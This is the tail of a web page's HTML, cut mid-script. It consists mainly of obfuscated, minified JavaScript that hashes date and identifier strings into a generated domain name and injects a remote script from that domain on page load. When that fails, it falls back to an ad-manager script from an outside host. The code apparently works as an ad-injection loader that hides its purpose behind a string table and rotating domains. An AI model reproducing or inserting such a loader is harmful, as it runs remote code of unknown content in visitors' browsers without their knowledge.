=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>